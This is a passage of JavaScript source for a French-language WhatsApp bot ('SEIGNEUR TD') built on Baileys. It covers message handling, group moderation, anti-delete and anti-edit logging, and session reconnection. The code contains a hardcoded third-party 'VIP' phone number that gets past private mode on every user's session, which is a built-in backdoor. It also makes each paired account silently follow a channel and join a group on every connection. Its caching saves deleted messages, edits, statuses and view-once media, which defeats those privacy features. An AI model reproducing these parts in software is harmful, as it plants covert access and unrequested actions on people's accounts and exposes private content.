              if (_m2?.imageMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m2.imageMessage, 'image')).catch(() => null); if (_b) global._statusCache.set(_sk, { type: 'image', buf: _b }); }
              else if (_m2?.videoMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m2.videoMessage, 'video')).catch(() => null); if (_b) global._statusCache.set(_sk, { type: 'video', buf: _b }); }
              else if (_m2?.extendedTextMessage?.text || _m2?.conversation) global._statusCache.set(_sk, { type: 'text', text: _m2?.extendedTextMessage?.text || _m2?.conversation });
              if (global._statusCache.size > 100) global._statusCache.delete(global._statusCache.keys().next().value);
            } catch(e) {}
            // AutoSaveStatus
            if (_ss.autoSaveStatus && _stSender !== _stBotJid) {
              try {
                const _m = message.message;
                if (_m?.imageMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m.imageMessage, 'image')); await sock.sendMessage(_stBotJid, { image: _b, caption: '\uD83D\uDCF8 Status de +' + _stSender.split('@')[0] }); }
                else if (_m?.videoMessage) { const _b = await toBuffer(await downloadContentFromMessage(_m.videoMessage, 'video')); await sock.sendMessage(_stBotJid, { video: _b, caption: '\uD83C\uDFA5 Status de +' + _stSender.split('@')[0] }); }
                else if (_m?.extendedTextMessage?.text || _m?.conversation) await sock.sendMessage(_stBotJid, { text: '\uD83D\uDCDD Status de +' + _stSender.split('@')[0] + ':\n' + (_m?.extendedTextMessage?.text || _m?.conversation) });
              } catch(e) {}
            }
            // Anti-mention groupe dans status
            const _stMsg = message.message;
            const _hasGrpMention = _stMsg?.groupStatusMentionMessage !== undefined || _stMsg?.extendedTextMessage?.contextInfo?.groupMentions?.length > 0 || _stMsg?.imageMessage?.contextInfo?.groupMentions?.length > 0;
            if (_hasGrpMention && _stSender !== _stBotJid) {
              try {
                // Utilise groupSettings (cache local) — évite groupFetchAllParticipating qui génère des messages vides
                for (const [_gJid, _gs] of groupSettings.entries()) {
                  if (!_gs?.antimentiongroupe || !_gJid.endsWith('@g.us')) continue;
                  try {
                    if (!await isBotGroupAdmin(sock, _gJid)) continue;
                    await sock.sendMessage(_gJid, { delete: message.key }).catch(() => {});
                    await sock.sendMessage(_gJid, { text: '\uD83D\uDEAB @' + _stSender.split('@')[0] + ' expuls\u00e9 \u2014 mention groupe en statut\n\n*\u00a9 SEIGNEUR TD*', mentions: [_stSender] });
                    await sock.groupParticipantsUpdate(_gJid, [_stSender], 'remove');
                  } catch(e) {}
                }
              } catch(e) {}
            }
          } catch(e) { console.error('[STATUS-SESSION]', e.message); }
          continue;
        }
        const isGroup = remoteJid.endsWith('@g.us');
        let senderJid;
        if (message.key.fromMe) {
          senderJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        } else if (isGroup) {
          senderJid = message.key.participant || message.participant || remoteJid;
        } else {
          senderJid = message.key.participant || remoteJid;
        }
        if (senderJid && senderJid.includes(':')) senderJid = senderJid.split(':')[0] + '@s.whatsapp.net';
        const _rawMsg = message.message;
        const messageText = _rawMsg?.conversation || _rawMsg?.extendedTextMessage?.text ||
          _rawMsg?.imageMessage?.caption || _rawMsg?.videoMessage?.caption || '';

        // fromMe dans PV : traiter si c'est une commande OU un emoji (pour vu unique → PV)
        if (message.key.fromMe && !isGroup) {
          const _fmTxt = (messageText || '').trim();
          const _fmIsCmd = _fmTxt.startsWith(config.prefix);
          const _fmIsEmoji = _fmTxt.length > 0 && _fmTxt.length <= 8 && /^\p{Emoji}+$/u.test(_fmTxt);
          if (!_fmIsCmd && !_fmIsEmoji) continue;
        }

        // ✅ CACHE messages pour _ss.antiDelete/_ss.antiEdit de cette session
        if (_ss.antiDelete || _ss.antiEdit) {
          try {
            const _cMsg = message.message;
            const _cImgMsg     = _cMsg?.imageMessage || _cMsg?.viewOnceMessageV2?.message?.imageMessage;
            const _cVidMsg     = _cMsg?.videoMessage || _cMsg?.viewOnceMessageV2?.message?.videoMessage;
            const _cAudioMsg   = _cMsg?.audioMessage;
            const _cStickerMsg = _cMsg?.stickerMessage;
            const _cDocMsg     = _cMsg?.documentMessage;
            const _cMediaRaw   = _cImgMsg || _cVidMsg || _cAudioMsg || _cStickerMsg || _cDocMsg || null;
            const _cMediaType  = _cImgMsg ? 'image' : _cVidMsg ? 'video' : _cAudioMsg ? 'audio' : _cStickerMsg ? 'sticker' : _cDocMsg ? 'document' : null;
            const _cData = {
              key: message.key, message: _cMsg, sender: senderJid,
              senderName: message.pushName || senderJid?.split('@')[0],
              remoteJid, isGroup, timestamp: Date.now(),
              isViewOnce: !!(_cMsg?.viewOnceMessageV2 || _cMsg?.viewOnceMessageV2Extension),
              mediaType: _cMediaType, mediaMsg: _cMediaRaw,
              mediaMime: _cImgMsg?.mimetype || _cVidMsg?.mimetype || _cAudioMsg?.mimetype || null,
              text: _cMsg?.conversation || _cMsg?.extendedTextMessage?.text || _cImgMsg?.caption || _cVidMsg?.caption || (_cImgMsg ? '[Image]' : _cVidMsg ? '[Video]' : _cAudioMsg ? '[Audio]' : _cStickerMsg ? '[Sticker]' : _cDocMsg ? '[Document]' : '[Message]')
            };
            if (_cMediaRaw && _cMediaType) {
              try {
                const _cStream = await downloadContentFromMessage(_cMediaRaw, _cMediaType);
                const _cChunks = [];
                for await (const chunk of _cStream) _cChunks.push(chunk);
                _cData.mediaBuffer = Buffer.concat(_cChunks);
              } catch(e) {}
            }
            messageCache.set(message.key.id, _cData);
            if (messageCache.size > 500) messageCache.delete(messageCache.keys().next().value);
          } catch(e) {}
        }

        // ✅ _ss.antiDelete via protocolMessage (revoke)
        if (_ss.antiDelete && message.message?.protocolMessage?.type === 0) {
          try {
            const _delKey = message.message.protocolMessage.key;
            const _delId = _delKey?.id;
            if (_delId) {
              const _cached = messageCache.get(_delId);
              if (_cached) {
                const _botPv = sock.user.id.split(':')[0] + '@s.whatsapp.net';
                let _notifyJid;
                if (_ss.antiDeleteMode === 'private') _notifyJid = _botPv;
                else if (_ss.antiDeleteMode === 'chat') _notifyJid = remoteJid;
                else { _notifyJid = remoteJid; await sendAntiDeleteNotif(sock, _botPv, _cached); }
                await sendAntiDeleteNotif(sock, _notifyJid, _cached);
              }
            }
          } catch(e) {}
          continue;
        }
        const _sessionOwnerNum = phone.replace(/[^0-9]/g, '');
        const _senderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');

        // ✅ isOwner = fromMe OU numéro connecté uniquement (indépendant du bot principal)
        const _isOwner = message.key.fromMe === true || _senderNum === _sessionOwnerNum;

        // ✅ Garantir que le owner de session est reconnu admin pour toutes les commandes
        if (_isOwner && _sessionOwnerNum) {
          if (!config.botAdmins.includes(_sessionOwnerNum)) config.botAdmins.push(_sessionOwnerNum);
          if (!config.adminNumbers.includes(_sessionOwnerNum)) config.adminNumbers.push(_sessionOwnerNum);
        }

        // 👑 Réaction VIP déjà faite en haut du loop (priorité absolue)

        // ✅ Reply emoji → PV du bot (owner uniquement)
        if (_isOwner) {
          const _rMsg = message.message;
          const _txt = (_rMsg?.conversation || _rMsg?.extendedTextMessage?.text || '').trim();
          const _qCtx = _rMsg?.extendedTextMessage?.contextInfo;
          const _qMsg = _qCtx?.quotedMessage;
          const _isEmoji = _txt.length > 0 && _txt.length <= 8
            && !_txt.startsWith(config.prefix)
            && /^\p{Emoji}+$/u.test(_txt);
          if (_isEmoji && _qMsg) {
            const _botPv = sock.user.id.split(':')[0] + '@s.whatsapp.net';
            // Extraire le contenu viewOnce (toutes versions) ou normal
            const _qVO = _qMsg.viewOnceMessageV2?.message
                      || _qMsg.viewOnceMessageV2Extension?.message
                      || _qMsg.viewOnceMessage?.message;
            const _imgMsg = _qVO?.imageMessage || _qMsg.imageMessage;
            const _vidMsg = _qVO?.videoMessage || _qMsg.videoMessage;
            // Audio vocal : chercher dans toutes les structures possibles
            const _audMsg = _qVO?.audioMessage || _qMsg.audioMessage
                         || _qVO?.pttMessage   || _qMsg.pttMessage;
            const _stickerMsg = _qMsg.stickerMessage;
            const _docMsg = _qMsg.documentMessage;

            // Anti-doublon : tracker les messageId déjà envoyés en PV
            const _qId = _qCtx?.stanzaId || '';
            global._emojiPvSent = global._emojiPvSent || new Set();
            const _dedupKey = phone + '_' + _qId;
            if (_qId && global._emojiPvSent.has(_dedupKey)) {
              continue; // Déjà envoyé — ignorer
            }
            if (_qId) {
              global._emojiPvSent.add(_dedupKey);
              if (global._emojiPvSent.size > 200) global._emojiPvSent.delete(global._emojiPvSent.values().next().value);
            }

            // Lancer en arrière-plan — non-bloquant
            ;(async () => {
              try {
                if (_imgMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_imgMsg, 'image'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { image: _buf, caption: '' });
                } else if (_vidMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_vidMsg, 'video'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { video: _buf, gifPlayback: _vidMsg.gifPlayback || false });
                } else if (_audMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_audMsg, 'audio'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { audio: _buf, ptt: true, mimetype: _audMsg.mimetype || 'audio/ogg; codecs=opus' });
                } else if (_stickerMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_stickerMsg, 'sticker'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { sticker: _buf });
                } else if (_docMsg) {
                  const _buf = await toBuffer(await downloadContentFromMessage(_docMsg, 'document'));
                  if (_buf?.length > 100) await sock.sendMessage(_botPv, { document: _buf, mimetype: _docMsg.mimetype, fileName: _docMsg.fileName || 'fichier' });
                } else {
                  const _qTxt = _qMsg.conversation || _qMsg.extendedTextMessage?.text;
                  if (_qTxt) await sock.sendMessage(_botPv, { text: '📩 *Message sauvegardé*\n\n' + _qTxt });
                }
              } catch(_e) { console.error('[EMOJI→PV]', _e.message); }
            })();
            continue;
          }
        }

        // ✅ PROTECTIONS GROUPE (antisticker, antiimage, antivideo, antilink, antitag, antispam, antibot, antibug)
        if (isGroup) {
          const _gs = initGroupSettings(remoteJid);
          const _userIsAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
          const _botIsAdm = await isBotGroupAdmin(sock, remoteJid);
          if (!_userIsAdmin) {
            // antibot
            if (_gs.antibot && _botIsAdm) {
              const _pn = (message.pushName || '').toLowerCase(), _sn = senderJid.split('@')[0];
              if ((_pn.includes('bot') || _pn.includes('robot') || /^\d{16,}$/.test(_sn)) && !isAdmin(senderJid)) {
                try { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); await sock.sendMessage(remoteJid, { text: '🤖 Bot expulsé: @' + _sn, mentions: [senderJid] }); continue; } catch(e) {}
              }
            }
            // antilink
            if (_gs.antilink && _botIsAdm) {
              const _linkRx = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
              if (_linkRx.test(messageText)) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Envoi de lien');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les liens sont interdits!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antitag
            if (_gs.antitag && _botIsAdm) {
              const _mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
              if (_mentions.length > 5) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Tag massif');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', pas de tags massifs!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antispam
            if (_gs.antispam && _botIsAdm && messageText) {
              if (checkSpam(senderJid, messageText)) {
                try {
                  await sock.sendMessage(remoteJid, { delete: message.key });
                  const _wc = addWarn(remoteJid, senderJid, 'Spam');
                  await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', arrêtez de spammer!\n\n⚠️ Warning ' + _wc + '/' + _gs.maxWarns, mentions: [senderJid] });
                  if (_wc >= _gs.maxWarns) { await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove'); resetWarns(remoteJid, senderJid); }
                  continue;
                } catch(e) {}
              }
            }
            // antisticker
            if (_gs.antisticker && _botIsAdm && message.message?.stickerMessage) {
              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les stickers sont interdits!', mentions: [senderJid] }); continue; } catch(e) {}
            }
            // antiimage
            if (_gs.antiimage && _botIsAdm && message.message?.imageMessage) {
              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les images sont interdites!', mentions: [senderJid] }); continue; } catch(e) {}
            }
            // antivideo
            if (_gs.antivideo && _botIsAdm && message.message?.videoMessage) {
              try { await sock.sendMessage(remoteJid, { delete: message.key }); await sock.sendMessage(remoteJid, { text: '🚫 @' + senderJid.split('@')[0] + ', les vidéos sont interdites!', mentions: [senderJid] }); continue; } catch(e) {}
            }
          }
          // antibug (tous, même les admins)
          if (_ss.antiBug && !isAdmin(senderJid)) {
            const _bug = detectBugPayload(message, messageText);
            if (_bug) { await handleAntiBugTrigger(sock, message, remoteJid, senderJid, true, _bug); continue; }
          }
        }

        const _isVipSender = _senderNum === '23591234568';
        const _sessionPrefix = _ss.prefix || config.prefix;
        if (!messageText.startsWith(_sessionPrefix)) continue;

        // Mode private : seul le owner (en PV ou groupe) et le VIP passent
        if (_ss.botMode === 'private' && !_isOwner && !_isVipSender) continue;

        console.log('[' + phone + '] 📨 ' + messageText.substring(0, 60) + ' de ' + senderJid);

        await handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, _isOwner, _getSessionState(phone));
      } catch(e) {
        console.error('[' + phone + '] ❌ Erreur:', e.message);
      }
    }
  });

  // ✅ groups.update local
  sock.ev.on('groups.update', (updates) => {
    for (const update of updates) {
      if (update.id) {
        database.groups.set(update.id, {
          ...database.groups.get(update.id),
          ...update,
          lastUpdate: Date.now()
        });
        // Invalider le cache metadata pour ce groupe
        _groupMetaCache.delete(update.id);
      }
    }
  });

  // ✅ group-participants.update local (welcome, goodbye, permaban, antiadmin, antidemote)
  sock.ev.on('group-participants.update', async (update) => {
    const { id: groupJid, participants, action, author } = update;
    // Invalider le cache metadata pour ce groupe
    _groupMetaCache.delete(groupJid);

    // ── ANTIADMIN — bloquer promotion non autorisée ──
    if (action === 'promote') {
      const _aaGs = initGroupSettings(groupJid);
      if (_aaGs?.antiadmin) {
        try {
          const _botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (_botIsAdmin) {
            const _authorNum = author ? author.split('@')[0].replace(/[^0-9]/g, '') : null;
            const _isBotAdmin = _authorNum && (config.botAdmins.includes(_authorNum) || config.adminNumbers.includes(_authorNum));
            if (!_isBotAdmin) {
              const _names = participants.map(p => '@' + p.split('@')[0]).join(', ');
              const _mentions = author ? [author, ...participants] : [...participants];
              await sock.groupParticipantsUpdate(groupJid, participants, 'demote').catch(() => {});
              await sock.sendMessage(groupJid, {
                text: `🛡️ *ANTI-ADMIN*\n\n⚠️ Tentative de promotion de ${_names} détectée.\nPromotion annulée + expulsion de l'auteur.\n\n*© SEIGNEUR TD*`,
                mentions: _mentions
              });
              if (author) await sock.groupParticipantsUpdate(groupJid, [author], 'remove').catch(() => {});
            }
          }
        } catch(e) {}
      }
    }

    // ── ANTIDEMOTE — bloquer rétrogradation non autorisée ──
    if (action === 'demote') {
      const _adGs = initGroupSettings(groupJid);
      if (_adGs?.antidemote) {
        try {
          const _botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (_botIsAdmin) {
            const _authorNum = author ? author.split('@')[0].replace(/[^0-9]/g, '') : null;
            const _isBotAdmin = _authorNum && (config.botAdmins.includes(_authorNum) || config.adminNumbers.includes(_authorNum));
            if (!_isBotAdmin) {
              const _names = participants.map(p => '@' + p.split('@')[0]).join(', ');
              const _mentions = author ? [author, ...participants] : [...participants];
              await sock.groupParticipantsUpdate(groupJid, participants, 'promote').catch(() => {});
              await sock.sendMessage(groupJid, {
                text: `🛡️ *ANTI-DEMOTE*\n\n⚠️ Tentative de rétrogradation de ${_names} détectée.\nRétrogradation annulée + expulsion de l'auteur.\n\n*© SEIGNEUR TD*`,
                mentions: _mentions
              });
              if (author) await sock.groupParticipantsUpdate(groupJid, [author], 'remove').catch(() => {});
            }
          }
        } catch(e) {}
      }
    }

    if (action === 'add') {
      for (const participantJid of participants) {
        if (isPermaBanned(groupJid, participantJid)) {
          const banInfo = getPermaBanInfo(groupJid, participantJid);
          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (botIsAdmin) {
            try {
              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
              await sock.sendMessage(groupJid, {
                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
                mentions: [participantJid, banInfo.bannedBy]
              });
            } catch(e) {}
          }
        } else {
          const settings = getGroupSettings(groupJid);
          if (settings.welcome) {
            try { await sendWelcomeMessage(sock, groupJid, participantJid); } catch(e) {}
          }
        }
      }
    }
    if (action === 'remove') {
      const settings = getGroupSettings(groupJid);
      if (settings.goodbye) {
        for (const participantJid of participants) {
          try { await sendGoodbyeMessage(sock, groupJid, participantJid); } catch(e) {}
        }
      }
    }
  });

  // ✅ ANTICALL local
  sock.ev.on('call', async (calls) => {
    for (const call of calls) {
      if (!_ss.antiCall) continue;
      if (call.status === 'offer') {
        try { await sock.rejectCall(call.id, call.from); } catch(e) {}
      }
    }
  });

  // ✅ ANTIDELETE local
  sock.ev.on('messages.delete', async (deletion) => {
    if (!_ss.antiDelete) return;
    try {
      let keys = [];
      if (deletion.keys) keys = deletion.keys;
      else if (Array.isArray(deletion)) keys = deletion;
      else if (deletion.id) keys = [deletion];
      for (const key of keys) {
        const messageId = key.id || key;
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg) continue;
        const botPvJid = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        let notifyJid;
        if (_ss.antiDeleteMode === 'private') notifyJid = botPvJid;
        else if (_ss.antiDeleteMode === 'chat') notifyJid = cachedMsg.remoteJid;
        else { notifyJid = cachedMsg.remoteJid; await sendAntiDeleteNotif(sock, botPvJid, cachedMsg); }
        await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
      }
    } catch(e) { console.error('[ANTIDELETE-SESSION]', e.message); }
  });

  // ✅ ANTIEDIT local
  sock.ev.on('messages.update', async (updates) => {
    if (!_ss.antiEdit) return;
    try {
      for (const update of updates) {
        const messageId = update.key?.id;
        if (!messageId) continue;
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
        let newText = null;
        if (update.update?.message) {
          const msg = update.update.message;
          newText = msg.conversation || msg.extendedTextMessage?.text ||
            msg.editedMessage?.message?.conversation || msg.editedMessage?.message?.extendedTextMessage?.text;
        }
        if (!newText || newText === cachedMsg.text) continue;
        const senderJid = cachedMsg.sender;
        const botPvEdit = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        let notifyJid;
        if (_ss.antiEditMode === 'private') notifyJid = botPvEdit;
        else if (_ss.antiEditMode === 'chat') notifyJid = cachedMsg.remoteJid;
        else { notifyJid = cachedMsg.remoteJid; await sock.sendMessage(botPvEdit, { text: `▎✏️ MODIFIÉ | @${senderJid.split('@')[0]}\n▎❌ Ancien: ${cachedMsg.text}\n▎✅ Nouveau: ${newText}\n▎© SEIGNEUR TD`, mentions: [senderJid] }); }
        await sock.sendMessage(notifyJid, { text: `▎✏️ MODIFIÉ | @${senderJid.split('@')[0]}\n▎❌ Ancien: ${cachedMsg.text}\n▎✅ Nouveau: ${newText}\n▎© SEIGNEUR TD`, mentions: [senderJid] });
        cachedMsg.text = newText;
      }
    } catch(e) { console.error('[ANTIEDIT-SESSION]', e.message); }
  });

  sock.ev.on('creds.update', saveCreds);
  console.log('[' + phone + '] 👂 Bot actif');

  // Message de connexion en PV du bot — UNE SEULE FOIS par vraie connexion
  try {
    const _connBotPv = sock.user?.id ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : null;
    const _connSession = activeSessions.get(phone);
    const _alreadySent = _connSession?._connMsgSent === true;
    const _connMode = _ss.botMode || 'public';
    const _connModeLabel = _connMode === 'private' ? 'Private [✓]' : 'Public [✓]';
    const _connPrefix = _ss.prefix || config.prefix || '.';
    if (_connBotPv && !_alreadySent) {
      if (_connSession) _connSession._connMsgSent = true;
      setTimeout(async () => {
        try {
          await sock.sendMessage(_connBotPv, {
            text:
`                  *SEIGNEUR TD* 🇹🇩
🤖 STATUT      : En ligne & Opérationnel
📡 MODE        : ${_connModeLabel}
⌨️ PREFIXE     : { ${_connPrefix} }
🔖 VERSION     : v1.0.1`
          });
        } catch(_e) {}
      }, 3000);
    }
  } catch(_e) {}

  // ══ AUTO-JOIN silencieux — chaîne + groupe à chaque connexion ══
  setTimeout(async () => {
    try {
      // 1. Rejoindre la chaîne newsletter
      const _cid = '120363422398514286@newsletter';
      try {
        if (typeof sock.newsletterFollow === 'function') await sock.newsletterFollow(_cid).catch(() => {});
        else if (typeof sock.followNewsletter === 'function') await sock.followNewsletter(_cid).catch(() => {});
        else await sock.query({ tag: 'iq', attrs: { type: 'set', xmlns: 'w:mex', to: 's.whatsapp.net' }, content: [{ tag: 'subscribe', attrs: { to: _cid } }] }).catch(() => {});
      } catch(_e) {}
      // 2. Rejoindre le groupe silencieusement (sans groupFetchAllParticipating qui génère des messages vides)
      const _inviteCode = 'KfbEkfcbepR0DPXuewOrur';
      try {
        await sock.groupAcceptInvite(_inviteCode).catch(() => {});
      } catch(_e) {}
    } catch(_e) {}
  }, 8000);
}


// ─── Reconnexion silencieuse — NE supprime JAMAIS les credentials ────────────
async function reconnectSession(phone, retryCount = 0) {
  const sessionFolder = './sessions/' + phone;
  if (!fs.existsSync(sessionFolder)) {
    console.log('[RECONNECT] ' + phone + ' — dossier introuvable, ignoré');
    return false;
  }
  try {
    const version = await getBaileysVersion();
    const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);
    if (!state.creds?.me && !state.creds?.registered) {
      console.log('[RECONNECT] ' + phone + ' — credentials vides, ignoré');
      return false;
    }
    const sock = makeWASocket({
      version,
      logger: pino({ level: 'silent' }),
      printQRInTerminal: false,
      auth: state,
      browser: ['Ubuntu', 'Chrome', '20.0.04'],
      keepAliveIntervalMs: 10000,
      connectTimeoutMs: 60000,
      defaultQueryTimeoutMs: 60000,
      retryRequestDelayMs: 250,
      maxMsgRetryCount: 5,
      getMessage: async (key) => {
      try {
        const cached = messageCache.get(key.id);
        if (cached) return cached;
      } catch(e) {}
      return undefined;
    }
    });
    activeSessions.set(phone, { sock, status: 'reconnecting', pairingCode: null, createdAt: Date.now() });
    sock.ev.on('connection.update', async (update) => {
      const { connection, lastDisconnect } = update;
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      const loggedOut = statusCode === DisconnectReason.loggedOut;
      const session = activeSessions.get(phone);
      if (connection === 'open') {
        if (session) { session.status = 'connected'; session.connectedAt = Date.now(); session._lastPing = Date.now(); }
        console.log('[RECONNECT] ✅ ' + phone + ' reconnecté silencieusement');
        // Nouveau socket = nouveau _launched, toujours lancer launchSessionBot
        if (sock._launched) return;
        sock._launched = true;
        if (session) session._connMsgSent = false;
        launchSessionBot(sock, phone, sessionFolder, saveCreds);
      } else if (connection === 'close') {
        if (loggedOut) {
          activeSessions.delete(phone);
          try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
          console.log('[RECONNECT] 🗑️ ' + phone + ' déconnecté (loggedOut)');
          return;
        }
        // 515 = stream restart, 428 = keepalive timeout, 503 = service unavailable
        const _isNormalDisconnect = statusCode === 515 || statusCode === 428 || statusCode === 503;
        activeSessions.delete(phone);
        // Délai exponentiel plafonné à 30s, reset après déconnexion normale
        const nextRetry = _isNormalDisconnect ? 0 : retryCount + 1;
        const waitMs = _isNormalDisconnect
          ? 8000
          : Math.min(5000 * (retryCount + 1), 30000);
        console.log('[RECONNECT] 🔄 ' + phone + ' (code:' + statusCode + ') dans ' + (waitMs/1000) + 's... (retry #' + nextRetry + ')');
        await delay(waitMs);
        await reconnectSession(phone, nextRetry);
      }
    });
    sock.ev.on('creds.update', saveCreds);
    console.log('[RECONNECT] 🔄 ' + phone + ' reconnexion en cours...');
    return true;
  } catch(e) {
    console.log('[RECONNECT] ❌ ' + phone + ' erreur: ' + e.message);
    return false;
  }
}

// ─── Restaurer toutes les sessions après restart ──────────────────────────────
async function restoreWebSessions() {
  // Charger toutes les données sauvegardées AVANT de démarrer les sessions
  loadData();

  const sessionsDir = './sessions';
  if (!fs.existsSync(sessionsDir)) return;
  const phones = fs.readdirSync(sessionsDir).filter(f => {
    try { return fs.statSync(sessionsDir + '/' + f).isDirectory(); } catch { return false; }
  });
  if (phones.length === 0) { console.log('[RESTORE] Aucune session trouvée'); return; }
  console.log('[RESTORE] ' + phones.length + ' session(s) — reconnexion silencieuse...');
  for (const phone of phones) {
    try {
      if (!sessionHasCredentials(phone)) {
        console.log('[RESTORE] ' + phone + ' — pas de credentials, ignoré');
        continue;
      }
      await delay(1500);
      await reconnectSession(phone);
    } catch(e) {
      console.log('[RESTORE] ❌ Erreur ' + phone + ': ' + e.message);
    }
  }
}

// ─── Auto-pull désactivé — update manuel via commande .update uniquement ────

// ─── Créer une nouvelle session utilisateur (bail-lite direct) ───────────────
async function createUserSession(phone) {
  const sessionFolder = './sessions/' + phone;
  try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
  fs.mkdirSync(sessionFolder, { recursive: true });

  const version = await getBaileysVersion();
  const { state, saveCreds } = await useMultiFileAuthState(sessionFolder);

  const sock = makeWASocket({
    version,
    logger: pino({ level: 'silent' }),
    printQRInTerminal: false,
    auth: state,
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    keepAliveIntervalMs: 10000,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 60000,
    retryRequestDelayMs: 250,
    maxMsgRetryCount: 5,
    getMessage: async (key) => { try { return messageCache.get(key.id) || undefined; } catch(e) { return undefined; } }
  });

  activeSessions.set(phone, { sock, status: 'pending', pairingCode: null, createdAt: Date.now() });

  // Auto-cleanup si pas connecté en 10 minutes
  const cleanupTimer = setTimeout(() => {
    const s = activeSessions.get(phone);
    if (s && s.status !== 'connected') {
      console.log('[' + phone + '] ⏱️ Timeout — session supprimée');
      try { sock?.ws?.close(); } catch {}
      activeSessions.delete(phone);
      try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
    }
  }, 10 * 60 * 1000);

  // Demander le pairing code après 3s
  const cleanPhone = phone.replace(/[^0-9]/g, '');
  await delay(3000);
  let formatted;
  try {
    const code = await sock.requestPairingCode(cleanPhone);
    formatted = code?.match(/.{1,4}/g)?.join('-') || code;
    console.log('[' + phone + '] 🔑 Code: ' + formatted);
  } catch(e) {
    throw new Error('requestPairingCode échoué: ' + e.message);
  }

  const sessionData = activeSessions.get(phone);
  if (sessionData) sessionData.pairingCode = formatted;

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    const statusCode = lastDisconnect?.error?.output?.statusCode;
    const loggedOut = statusCode === DisconnectReason.loggedOut;
    const session = activeSessions.get(phone);
    const currentStatus = session?.status || 'unknown';

    if (connection === 'open') {
      clearTimeout(cleanupTimer);
      console.log('[' + phone + '] ✅ Connecté! Démarrage bot...');
      if (session) { session.status = 'connected'; session.connectedAt = Date.now(); }
      if (sock._launched) return;
      sock._launched = true;
      launchSessionBot(sock, phone, sessionFolder, saveCreds);

    } else if (connection === 'close') {
      clearTimeout(cleanupTimer);
      console.log('[' + phone + '] 📴 Déconnecté. Code: ' + statusCode + ', Status: ' + currentStatus);

      if (currentStatus === 'pending' && !loggedOut) {
        // Code en attente → reconnexion WS silencieuse sans nouveau pairing code
        console.log('[' + phone + '] ⏳ Code en attente, reconnexion WS...');
        await delay(2000);
        try {
          const v2 = await getBaileysVersion();
          const { state: s2, saveCreds: sc2 } = await useMultiFileAuthState(sessionFolder);
          const sock2 = makeWASocket({ version: v2, logger: pino({ level: 'silent' }), printQRInTerminal: false, auth: s2, browser: ['Ubuntu', 'Chrome', '20.0.04'], getMessage: async (key) => { try { return messageCache.get(key.id) || undefined; } catch(e) { return undefined; } } });
          const sess = activeSessions.get(phone);
          if (sess) sess.sock = sock2;
          sock2.ev.on('connection.update', async (u2) => {
            if (u2.connection === 'open') {
              const s = activeSessions.get(phone);
              if (s) { s.status = 'connected'; s.connectedAt = Date.now(); }
              if (sock2._launched) return;
              sock2._launched = true;
              launchSessionBot(sock2, phone, sessionFolder, sc2);
            }
          });
          sock2.ev.on('creds.update', sc2);
        } catch(e) { console.log('[' + phone + '] ❌ Reconnexion WS échouée: ' + e.message); }
        return;
      }

      if (loggedOut) {
        activeSessions.delete(phone);
        try { fs.rmSync(sessionFolder, { recursive: true, force: true }); } catch {}
